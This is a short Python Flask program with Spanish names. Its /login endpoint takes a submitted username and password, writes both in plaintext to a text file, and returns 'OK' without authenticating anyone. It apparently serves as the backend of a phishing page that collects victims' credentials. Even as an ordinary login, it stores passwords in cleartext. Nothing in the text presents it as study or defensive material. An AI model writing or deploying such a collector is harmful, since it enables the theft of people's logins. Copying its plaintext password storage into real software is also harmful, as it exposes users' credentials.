from flask import Flask, request

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    usuario = request.form.get("usuario")
    contraseña = request.form.get("contraseña")

    with open("datos.txt", "a", encoding="utf-8") as f:
        f.write(f"Nombre:{usuario} . Contraseña:{contraseña}\n")

    return "OK"

if __name__ == "__main__":
    app.run()